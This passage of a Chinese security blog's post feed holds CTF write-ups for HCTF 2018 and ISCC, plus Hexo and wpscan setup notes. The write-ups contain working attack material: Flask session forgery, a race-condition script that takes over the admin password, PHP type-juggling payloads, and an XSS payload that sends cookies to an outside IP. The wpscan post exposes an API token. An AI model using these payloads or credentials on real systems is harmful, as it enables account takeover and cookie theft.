        if(file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):
            return redirect(url_for(&#39;index&#39;, error=1))
    return Response(file)


if __name__ == &#39;__main__&#39;:
    #app.run(debug=True)
    app.run(host=&#39;127.0.0.1&#39;, debug=True, port=10008)</code></pre>
<p>知道了他security_key的生成方式：<code>app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)</code></p>
<p><code>random.seed(uuid.getnode())</code>，种子是<code>uuid.getnode()</code>，服务器mac地址的十进制数。</p>
<p>去读一下mac地址：<code>/sys/class/net/eyh0/address</code></p>
<p>看一下原cookie的内容：<code>&#123;&quot;username&quot;:&quot;aaa&quot;&#125;</code></p>
<p>起个flask生成一下admin的session去替换cookie就ok了。</p>
<p>[要用python3]</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><h3 id="解法一：利用unicode编码"><a href="#解法一：利用unicode编码" class="headerlink" title="解法一：利用unicode编码"></a>解法一：利用unicode编码</h3><p><a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a></p>
<p><code>nodeprep.prepare</code>函数处理用户名造成的问题</p>
<pre><code class="python">def strlower(username):
    username = nodeprep.prepare(username)
    return username</code></pre>
<p>注册一个<code>ᴬdmin</code>，处理后变成<code>Admin</code>，更改密码改的是<code>admin</code>的密码，登陆就ok了。</p>
<h3 id="解法二：伪造session"><a href="#解法二：伪造session" class="headerlink" title="解法二：伪造session"></a>解法二：伪造session</h3><p>github能搜到源码<a href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a></p>
<p>有security_key，我们就可以伪造session了，利用admin登陆就ok。</p>
<pre><code class="python">class Config(object):
    SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;
    SQLALCHEMY_DATABASE_URI = &#39;mysql+pymysql://root:adsl1234@db:3306/test&#39;
    SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre>
<h3 id="解法三：条件竞争"><a href="#解法三：条件竞争" class="headerlink" title="解法三：条件竞争"></a>解法三：条件竞争</h3><p>来自<a href="https://xz.aliyun.com/t/3242#toc-14">Whitzard的wp</a></p>
<p>脚本</p>
<pre><code class="python">import requests
import threading

def login(s, username, password):
    data = &#123;
        &#39;username&#39;: username,
        &#39;password&#39;: password,
        &#39;submit&#39;: &#39;&#39;
    &#125;
    return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)

def logout(s):
    return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)

def change(s, newpassword):
    data = &#123;
        &#39;newpassword&#39;:newpassword
    &#125;
    return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)

def func1(s):
    login(s, &#39;ddd&#39;, &#39;ddd&#39;)
    change(s, &#39;qweqweabcabc&#39;)

def func2(s):
    logout(s)
    res = login(s, &#39;admin&#39;, &#39;qweqweabcabc&#39;)
    if &#39;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&#39; in res.text:
        print(&#39;finish&#39;)

def main():
    for i in range(1000):
        print(i)
        s = requests.Session()
        t1 = threading.Thread(target=func1, args=(s,))
        t2 = threading.Thread(target=func2, args=(s,))
        t1.start()
        t2.start()

if __name__ == &quot;__main__&quot;:
    main()</code></pre>
<p>源码里改密码的username直接从session中取了。</p>
<pre><code class="python">def login():
    if current_user.is_authenticated:
        return redirect(url_for(&#39;index&#39;))

    form = LoginForm()
    if request.method == &#39;POST&#39;:
        name = strlower(form.username.data)
        session[&#39;name&#39;] = name        #这
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash(&#39;Invalid username or password&#39;)
            return redirect(url_for(&#39;login&#39;))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for(&#39;index&#39;))
    return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)

@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for(&#39;login&#39;))
    form = NewpasswordForm()
    if request.method == &#39;POST&#39;:
        name = strlower(session[&#39;name&#39;])    #这里造成了问题
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash(&#39;change successful&#39;)
        return redirect(url_for(&#39;index&#39;))
    return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)</code></pre>
<h2 id="bottle"><a href="#bottle" class="headerlink" title="bottle"></a>bottle</h2><blockquote>
<p>Not hard, I believe you are the lucky one!</p>
</blockquote>
<p>crlf+xss</p>
<pre><code>https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html?tdsourcetag=s_pctim_aiomsg</code></pre>
<p>payload：</p>
<pre><code>http://bottle.2018.hctf.io/path?path=http://bottle.2018.hctf.io:22/user%0AX-XSS-Protection:0%0A%0A%3Cscript%3Elocation.href=`http://39.107.83.129/xss/?a=`%2bdocument.cookie%3C/script%3E</code></pre>
<p>替换弹回来的cookie就OK了</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+Next添加Algolia搜索</title>
    <url>/2017/04/06/hexo-next-tian-jia-algolia-sou-suo/</url>
    <content><![CDATA[<h1 id="Hexo-Next-添加Algolia搜索"><a href="#Hexo-Next-添加Algolia搜索" class="headerlink" title="Hexo+Next 添加Algolia搜索"></a>Hexo+Next 添加Algolia搜索</h1><blockquote>
<blockquote>
<p>网上有不少教程，但在说的不是很清楚，有的因为版本不同造成配置文件的修改不一样，这里对Next 5.0.1版本的配置做一些整理，或是说对教程中不详细的地方做一些补充。</p>
</blockquote>
</blockquote>
<p>用到资料：</p>
<ul>
<li><p><a href="http://blog.niices.com/Hexo-Next-Algolia-Search/">http://blog.niices.com/Hexo-Next-Algolia-Search/</a></p>
</li>
<li><p><a href="https://www.zhihu.com/question/46822587/answer/109403261">https://www.zhihu.com/question/46822587/answer/109403261</a></p>
</li>
<li><p><a href="https://github.com/iissnan/hexo-theme-next/issues/1084">https://github.com/iissnan/hexo-theme-next/issues/1084</a></p>
<p>​    对于注册Algolia和获取信息参照第一条参考链接，注意向_config.yml文件中添加配置信息时，第一行algolia前面不要有空格，不然会报错，我这里后面还有一个报错是<code>algolia async.js 61 fn=.....</code>，如果出现这个报错的话，去<code>\node_modules\bluebird\js\release</code>路径下去修改asygn.js文件的第61行。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170406/173529547.png" alt="mark"></p>
<p>这是我原本的第61行代码：</p>
<pre><code>        fn = function () &#123; throw arg; &#125;;</code></pre>
<p>修改成：</p>
<pre><code>        fn = function () &#123; throw new arg; &#125;;</code></pre>
<p>到这里就可以正常的执行以下命令了。</p>
<pre><code>npm install hexo-algoliasearch --save
hexo algolia</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170406/173601767.png" alt="mark"></p>
<p>apikey,appid什么的按照第一个教程来就行，填到配置文件的‘ ’内就好。</p>
<p>接下来在主题里面的 _config.yml 中修改</p>
<pre><code>algolia_search:
  enable: true</code></pre>
<p>​    到这之后我的博客中已经有搜索图标了，也可以搜索到文章了，但点击搜素到的文章不会转到该文章。去algolia网站查看一下，发现上传到数据库的文件有个<code>permalink：yoursite/./..</code>,很明显跳转不到我的文章啊。这里做如下修改：</p>
<p>去<code>node_modules/hexo-algolia/lib</code>， 找到<code>command.js</code>，加<code>path</code>,再修改最后的permalink字段。</p>
<p>修改前：</p>
<pre><code>var storedPost = _.pick(data, [&#39;title&#39;, &#39;date&#39;, &#39;slug&#39;, &#39;content&#39;, &#39;excerpt&#39;, &#39;permalink&#39;]); </code></pre>
<p>修改后：</p>
<pre><code>var storedPost = _.pick(data, [&#39;title&#39;, &#39;date&#39;, &#39;slug&#39;, &#39;path&#39; , &#39;content&#39;, &#39;excerpt&#39;, &#39;objectID&#39;]);</code></pre>
<p>然后修改站点的配置文件（大约在17行的位置）：</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170406/173225315.png" alt="mark"></p>
<p>然后就配置完成了。</p>
<p>在配置文件可以更改对应的描述性语句。;）</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170406/173416035.png" alt="mark"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP-Header有关的web题思路</title>
    <url>/2017/04/23/http-header/</url>
    <content><![CDATA[<h1 id="HTTP-Header有关的web题思路"><a href="#HTTP-Header有关的web题思路" class="headerlink" title="HTTP-Header有关的web题思路"></a>HTTP-Header有关的web题思路</h1><p>1.改UA</p>
<p>User-Agent：用户代理（浏览器信息）</p>
<blockquote>
<p><a href="http://blog.csdn.net/wer1234s/article/details/19028569">http://blog.csdn.net/wer1234s/article/details/19028569</a></p>
</blockquote>
<p>2.改Accept-Language</p>
<table>
<thead>
<tr>
<th align="center">语言代码</th>
<th align="center">语言名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">en-GB</td>
<td align="center">英语(英国)</td>
</tr>
<tr>
<td align="center">en-US</td>
<td align="center">英语(美国)</td>
</tr>
<tr>
<td align="center">ja-JP</td>
<td align="center">日语</td>
</tr>
<tr>
<td align="center">ru-RU</td>
<td align="center">鳄鱼</td>
</tr>
<tr>
<td align="center">zh-CN</td>
<td align="center">中文(简体)</td>
</tr>
<tr>
<td align="center">zh-HK</td>
<td align="center">中文(香港)</td>
</tr>
<tr>
<td align="center">zh-MO</td>
<td align="center">中文(澳门)</td>
</tr>
<tr>
<td align="center">zh-TW</td>
<td align="center">中文(繁体)</td>
</tr>
</tbody></table>
<p><a href="http://www.lingoes.cn/zh/translator/langcode.htm">http://www.lingoes.cn/zh/translator/langcode.htm</a></p>
<p>3.Referer来源伪造</p>
<blockquote>
<p><a href="https://zhidao.baidu.com/question/1832550088624773020.html">https://zhidao.baidu.com/question/1832550088624773020.html</a></p>
<p><a href="http://www.cnblogs.com/mx3000/archive/2007/12/17/1003239.html">http://www.cnblogs.com/mx3000/archive/2007/12/17/1003239.html</a></p>
</blockquote>
<p>4.XFF头（ip伪造）</p>
<p>X-Forwarded-For： ，在burp的headers里添加XFF头就可以了。</p>
<p>5.cookie修改</p>
<p>设置login＝1</p>
<p>6.http请求头或响应头有flag</p>
<p>7.设置了302跳转的网页中有flag</p>
]]></content>
      <tags>
        <tag>websec</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo版本升级指南</title>
    <url>/2020/02/16/hexo-ban-ben-sheng-ji/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>更换了新主题，在hexo g和hexo s的时候总会报如下错误，在主题github issues逛了一圈后，感觉应该是我的hexo版本太老了。</p>
<pre><code>➜ hexo s
(node:64285) [DEP0061] DeprecationWarning: fs.SyncWriteStream is deprecated.
INFO  Start processing
ERROR Process failed: layout/archive.ejs
SyntaxError: Invalid or unexpected token in &quot;/Users/lanvnal/Files/blog/themes/hexo-theme-matery/layout/archive.ejs&quot;
    at new Function (&lt;anonymous&gt;)
    at Object.exports.compile (/Users/lanvnal/Files/blog/node_modules/ejs/lib/ejs.js:242:14)
    at Function.ejsRenderer.compile (/Users/lanvnal/Files/blog/node_modules/hexo-renderer-ejs/lib/renderer.js:11:14)
    at Theme._View.View.View._precompile (/Users/lanvnal/Files/blog/node_modules/hexo/lib/theme/view.js:117:31)</code></pre>
<p>决定升级hexo版本，但是没找到很明确的升级hexo的文章，遂做一下记录。</p>
<h2 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h2><p>1、全局升级hexo-cli，先<code>hexo version</code>查看当前版本，然后<code>npm i hexo-cli -g</code>，再次<code>hexo version</code>查看是否升级成功。</p>
<p>2、使用<code>npm install -g npm-check</code>和<code>npm-check</code>，检查系统中的插件是否有升级的，可以看到自己前面都安装了那些插件</p>
<p>3、使用<code>npm install -g npm-upgrade</code>和<code>npm-upgrade</code>，升级系统中的插件</p>
<p>4、使用<code>npm update -g</code>和<code>npm update --save</code></p>
<p>PS：第四步遇到了错误，错误提示如下：</p>
<pre><code>&gt; fsevents@1.2.11 install /Users/lanvnal/Files/blog/node_modules/hexo/node_modules/fsevents
&gt; node-gyp rebuild

xcode-select: error: tool &#39;xcodebuild&#39; requires Xcode, but active developer directory &#39;/Library/Developer/CommandLineTools&#39; is a command line tools instance

xcode-select: error: tool &#39;xcodebuild&#39; requires Xcode, but active developer directory &#39;/Library/Developer/CommandLineTools&#39; is a command line tools instance

No receipt for &#39;com.apple.pkg.CLTools_Executables&#39; found at &#39;/&#39;.

No receipt for &#39;com.apple.pkg.DeveloperToolsCLILeo&#39; found at &#39;/&#39;.

No receipt for &#39;com.apple.pkg.DeveloperToolsCLI&#39; found at &#39;/&#39;.
gyp: No Xcode or CLT version detected!</code></pre>
<p>其实已经安装过了xcode cli，但是这里还是报错了，估计和苹果新系统有关，重装就好了，操作如下：</p>
<p>如果像以前一样执行<code>xcode-select --install</code>会有如下报错：</p>
<pre><code>xcode-select: error: command line tools are already installed, use &quot;Software Update&quot; to install updates</code></pre>
<p>解决办法：</p>
<pre><code>sudo rm -rf /Library/Developer/CommandLineTools
xcode-select --install</code></pre>
<p>然后再执行第四步，完美升级。</p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac下Brew安装的wpscan无法更新的问题</title>
    <url>/2020/02/07/mac-xia-brew-an-zhuang-de-wpscan-wu-fa-geng-xin-de-wen-ti/</url>
    <content><![CDATA[<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>Mac下使用HomeBrew安装最新的wpscan，在wpscan更新数据库时发生错误。</p>
<pre><code class="shell">➜ ./wpscan --update
cli_options:
  api_token: pTBhWI3kRUbP8KV3vD6nCtpDussLs9dwYX7bvCSahwQ
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
cli_options:
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] Updating the Database ...

[!] Unable to get https://data.wpscan.org/local_vulnerable_files.xml.sha512 (status: 403)</code></pre>
<p>curl结果：</p>
<pre><code>➜ curl https://data.wpscan.org/local_vulnerable_files.xml.sha512
error code: 1020%</code></pre>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>应该是版本太老的原因，最新版本已经是3.7.7了，但是brew的没有及时更新。<br>去GitHub的wpscan项目clone最新源码，自行编译就好。</p>
<pre><code>➜ git clone https://github.com/wpscanteam/wpscan
➜ cd wpscan
➜ bundle install &amp;&amp; rake install</code></pre>
<blockquote>
<p>网络问题可代理解决。</p>
</blockquote>
<p>使用上的问题：<br>现在使用wpscan需要使用官方的api-token，这个可以自己注册一个免费的账号，每日50使用次数。<br><a href="https://wpvulndb.com/users/choose_plan">注册地址</a></p>
<p>为了方便使用，可以将api-token保存在文件中<br>在<code>~/.wpscan/scan.yml</code>文件中添加如下内容：</p>
<pre><code>cli_options:
  api_token: YOUR_API_TOKEN</code></pre>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>Mac</tag>
        <tag>wpscan</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCC-WriteUp</title>
    <url>/2017/05/02/iscc-writeup/</url>
    <content><![CDATA[<h1 id="ISCC-WriteUp"><a href="#ISCC-WriteUp" class="headerlink" title="ISCC-WriteUp"></a>ISCC-WriteUp</h1><h2 id="0X01-Basic"><a href="#0X01-Basic" class="headerlink" title="0X01 Basic"></a>0X01 Basic</h2><p>1.Wheel Cipher（50）</p>
<p>Jefferson disk（杰弗逊盘），查看<a href="https://www.wikiwand.com/en/Jefferson_disk">wiki</a>其加密方法。</p>
<p>关键部分摘录下来。</p>
<pre><code>Operation
To encrypt a message, Alice rotates the disks to produce the plaintext message along one &quot;row&quot; of the stack of disks, and then selects another row as the ciphertext. To decrypt the message, Bob rotates the disks on his cylinder to produce the ciphertext along a row. It is handy if both Alice and Bob know the offset of the row, but not really necessary since Bob can simply look around the cylinder to find a row that makes sense.

For example, a simplified &quot;toy&quot; Bazeries cylinder using only ten disks might be organised as shown below, with each disk &quot;unwrapped&quot; into a line and each marked with a designating number:

1:    &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;
2:    &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;
3:    &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;
4:    &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;
5:    &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;
6:    &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;
7:    &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;
8:    &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;
9:    &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;
10:    &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;
If the &quot;key&quot;, the sequence of disks, for this Bazeries cylinder is

7,9,5,10,1,6,3,8,2,4
and Alice wants to send the message &quot;retreat now&quot; to Bob, she rearranges the disks as per the key and rotates each disk to obtain the plaintext, which is shown at the left, with spacing added for clarity:

7:    &lt; R AFDCE O NJQGWTHSPYBXIZULVKM &lt;
9:    &lt; E NYVUB M CQWAOIKZGJXPLTDSRFH &lt;
5:    &lt; T SGJVD K CPMNZQWXYIHFRLABEUO &lt;
10:    &lt; R SCZQK E LMXYIHPUDNAJFBOWTGV &lt;
1:    &lt; E ZWAXJ G DLUBVIQHKYPNTCRMOSF &lt;
6:    &lt; A MKGHI W PNYCJBFZDRUSLOQXVET &lt;
3:    &lt; T EQGYX P LOCKBDMAIZVRNSJUWFH &lt;
8:    &lt; N OZUTW D CVRJLXKISEFAPMYGHBQ &lt;
2:    &lt; O YHGVS F UWIKPBELNACZDTRXMJQ &lt;
4:    &lt; W AORPL N DVHGFCUKTEBSXQYIZMJ &lt;
She then selects the ciphertext from the sixth row of the cylinder up from the plaintext. This ciphertext is also highlighted above with spacing, and gives:

OMKEGWPDFN
When Bob gets the ciphertext, he rearranges the disks on his cylinder to the key arrangement, rotates the disks to give the ciphertext, and then reads the plaintext six rows down from the ciphertext, or simply looks over the cylinder for a row that makes sense.</code></pre>
<p>简述一下解密的方法：</p>
<blockquote>
<p>给出了加密表，密匙和密文。</p>
<p>1.将加密表根据密匙的数字顺序排序。</p>
<p>2.每一行相当于一个滚轮，字母是环形首尾相接排列的，按照密文将加密表每一行重新排列，使第一个字母符合密文，排列时当作一个环进行排列。</p>
<p>3.排好后按列读出，看看哪列成句子。</p>
</blockquote>
<pre><code>加密表：
1:    &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;
2:    &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;
3:    &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;
4:    &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;
5:    &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;
6:    &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;
7:    &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;
8:    &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;
9:    &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;
10:    &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;
11：    &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;
12：    &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;
13：    &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;

密钥为：2，3，7，5，13,12,9，1，8，10，4，11，6
密文为：NFQKSEVOQOFNP

2:    &lt; N ACZDTRXMJQOYHGVS FUWIKPBEL &lt;
3:    &lt; F HTEQGYXPLOCKBDMA IZVRNSJUW &lt;
7:    &lt; Q GWTHSPYBXIZULVKM RAFDCEONJ &lt;
5:    &lt; K CPMNZQWXYIHFRLAB EUOTSGJVD &lt;
13：    &lt; S XCDERFVBGTYHNUMK ILOPJZQAW &lt;
12：    &lt; E IURYTASBKJDFHGLV NCMXZPQOW &lt;
9:    &lt; V UBMCQWAOIKZGJXPL TDSRFHENY &lt;
1:    &lt; O SFEZWAXJGDLUBVIQ HKYPNTCRM &lt;
8:    &lt; Q NOZUTWDCVRJLXKIS EFAPMYGHB &lt;
10:    &lt; O WTGVRSCZQKELMXYI HPUDNAJFB &lt;
4:    &lt; F CUKTEBSXQYIZMJWA ORPLNDVHG &lt;
11：    &lt; N BVCXZQWERTPOIUYA LSKDJFHGM &lt;
6:    &lt; P NYCJBFZDRUSLOQXV ETAMKGHIW &lt;

--&gt;FIREINTHEHOLE</code></pre>
<p>2.神秘图片（100）</p>
<p>下载附件是一png格式图片<a href="http://omfp4wyym.bkt.clouddn.com/blog/20170502/002753940.png">下载</a></p>
<p>放到pngcheck看一下，发现IEND块里有东西。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170502/002916852.png" alt="mark"></p>
<p>用foremost进行恢复。</p>
<p>执行<code>foremost -v 1.png</code>,文件生成一个文件夹。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170502/003243173.png" alt="mark"></p>
<p>查看恢复出来的图片。</p>
<p>发现里面有个这个，是猪圈密码。<a href="http://haojiawei.xyz/2017/02/08/%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81/">猪圈密码</a></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170502/003401527.png" alt="mark"></p>
<p>解得-goodluck。</p>
<p>3.告诉你个秘密（100）</p>
<pre><code>636A56355279427363446C4A49454A7154534230526D6843
56445A31614342354E326C4B4946467A5769426961453067

-----------------------------------------------------
16进制转字符
cjV5RyBscDlJIEJqTSB0RmhC
VDZ1aCB5N2lKIFFzWiBiaE0g
-------------------------------------------------------
解base64
r5yG lp9I BjM tFhB
T6uh y7iJ QsZ bhM 
---------------------------
tongyuan</code></pre>
<p>4.你猜猜（100）</p>
<p>下载得</p>
<pre><code>504B03040A0001080000626D0A49F4B5091F1E0000001200000008000000666C61672E7478746C9F170D35D0A45826A03E161FB96870EDDFC7C89A11862F9199B4CD78E7504B01023F000A0001080000626D0A49F4B5091F1E00000012000000080024000000000000002000000000000000666C61672E7478740A0020000000000001001800AF150210CAF2D1015CAEAA05CAF2D1015CAEAA05CAF2D101504B050600000000010001005A000000440000000000</code></pre>
<p>看到504B应该就知道是怎么回事了，这是一个zip文件的16进制数据。</p>
<p>16进制编辑保存为zip文件，打开发现flag.txt被加密，尝试伪加密无果，转而爆破，得key：123456，得flag。</p>
<p>5.公邮密码（100）</p>
<p>下载得一个加密的zip文件，爆破得到密码，输入密码得到base64加密过的flag，解密即可。</p>
<p>6.二维码（150）</p>
<p>​    下载是一个二维码，内容是<code>The password of the router is our flag</code>说flag在路由器里。改为zip，内容被加密，文件名比较不同<code>u5bc6u7801u7eafu6570u5b57u5171u0038u4f4d</code>，是Unicode编码，解码后告诉我们密码纯数字共8位。爆破得密码为20161114.</p>
<p>​    解压后又给出了密码提示和一个.cap的文件，用<a href="http://baike.baidu.com/link?url=UZsZItyiU4vTIpjxtz3wK3nGgLu22w-XIvKCkFGQ1LvwN_UziKZtAFzOFVDUfScM_zlZTB1NHAT0wGZu3H1DDq">EWSA</a>爆破。根据提示<code>前四位是ISCC 后四位由大写字母和数字构成</code>，写出字典。</p>
<pre><code>s=&#39;1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
ss=&#39;ISCC&#39;
flag=open(&#39;1.txt&#39;,&#39;w&#39;)
for a in s:
    for b in s:
        for c in s:
            for d in s:
                key=ss+a+b+c+d
                flag.write(key)
                flag.write(&#39;\n&#39;)
flag.close()
</code></pre>
<p>爆破得密码即flag.</p>
<h2 id="0X02-Misc"><a href="#0X02-Misc" class="headerlink" title="0X02 Misc"></a>0X02 Misc</h2><p>1.眼见非实（100）</p>
<p>下载的是一个word文档，出错打不开。改一下后缀解压出来，在document.xml文件中有flag。</p>
<p>2.普通Disco（250）</p>
<p>下载是一个disco.wav文件，频谱分析，开头一段又东西。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/113052128.png" alt="mark"></p>
<p>高低位对应01，然后二进制转十进制，再转字符。</p>
<pre><code>1100110    102
1101100    108
1100001    97
1100111    103
1111011    123
1010111    87
0110000    48
1010111    87
0101010    42
1100110    102
1110101    117
1101110    110
1101110    110
1111001    121
1111101    125

flag&#123;W0W*funny&#125;</code></pre>
<p>3.很普通的数独（300）</p>
<p>下载得到25个数独图片，有数字的格涂黑，拼成二维码。（ps大法好）</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/120732519.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/120748410.png" alt="mark"></p>
<p>扫码，解base64，得flag。</p>
<p>4.就在其中（100）</p>
<p>wireshark分析没东西，转而去binwalk分离文件，分离出的一堆东西里又个压缩包，可以解压出key.txt,但打开是乱码，文件中还有一个rsa解密key，openssl命令解密得flag。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/162146042.png" alt="mark"></p>
<p>命令：</p>
<pre><code># openssl rsautl -decrypt -in &#39;/root/output/zip/00000047/key.txt&#39; -inkey &#39;/root/_Misc-03.pcapng.extracted/AC76.key&#39; -out key.de</code></pre>
<blockquote>
<p>openssl -RSA资料</p>
<p><a href="http://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html">http://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html</a></p>
</blockquote>
<h2 id="0X03-Web"><a href="#0X03-Web" class="headerlink" title="0X03 Web"></a>0X03 Web</h2><p>1.自相矛盾（150）</p>
<pre><code>
打破常规，毁你三观！！！！

&lt;!--
$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET[&#39;iscc&#39;]);  #json格式传入数据，get方式读入

if(is_array($a))&#123;
    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL;
    if(@$a[&quot;bar1&quot;])&#123;
        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;    #iscc中的bar1不能是数字还得大于2016
    &#125;
    if(is_array(@$a[&quot;bar2&quot;]))&#123;
        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;);
            #bar2是5位数组且第0位也是数组
        $pos = array_search(&quot;nudt&quot;, $a[&quot;bar2&quot;]); 
        $pos===false?die(&quot;nope&quot;):NULL;   #bar2的每一位要含有nudt
        foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123;
            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;    #bar2的每一位不能含有nudt
        &#125;
        $v2=1;

    &#125;    
&#125;
$c=@$_GET[&#39;cat&#39;];
$d=@$_GET[&#39;dog&#39;];
if(@$c[1])&#123;
    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123;  #0&amp;&amp;1

        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL;
        strpos(($c[0].$d), &quot;isccctf2017&quot;)?$v3=1:NULL; #要有isccctf2017

    &#125;

&#125;
if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; 

   echo $flag;
&#125;
--&gt;
</code></pre>
<p>php的弱类型：当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比</p>
<p>传{“bar1”:”2017a”}就好了。</p>
<p>intval(nudt)=0,所以{“bar2”:”[[0],0,0,0,0]”}</p>
<p>cat要是数组，cat[1]和dog比较，要strcmp为0，cat[1]!==dog为1，所以让cat[1]为数字，dog为字符。</p>
<p>dog又要包含isccctf2017，用%00截断。</p>
<p>payload：<code>?iscc=&#123;&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[0],0,0,0,0]&#125;&amp;cat[0]=1&amp;cat[1][]=1&amp;dog=%00isccctf2017</code></p>
<p>2.我们一起来日站（150）</p>
<p>看一下/robots.txt，</p>
<pre><code>#
# robots.txt 
#
User-agent: * 
Disallow: /21232f297a57a5a743894a0e4a801fc3/
Disallow: /api
</code></pre>
<p>去访问<code>http://139.129.108.53:5090/web-04/21232f297a57a5a743894a0e4a801fc3/</code>，猜测登陆页面为<code>http://139.129.108.53:5090/web-04/21232f297a57a5a743894a0e4a801fc3/admin.php</code>.</p>
<p>正确，进入登陆页面，抓包，万能密码登陆,得到flag。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170519/210143688.png" alt="mark"></p>
<blockquote>
<p>后台登陆万能密码</p>
<p><a href="https://www.douban.com/note/168041331/">https://www.douban.com/note/168041331/</a></p>
</blockquote>
<p>3.交换flag（100）</p>
<p>​    抓个包，参数传入的值为<code>f1ag</code>,这个在题目页面细心一点可以发现，再就是参数名称的问题，每一次根据反馈不断添加就好。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170519/210535245.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170519/210642673.png" alt="mark"></p>
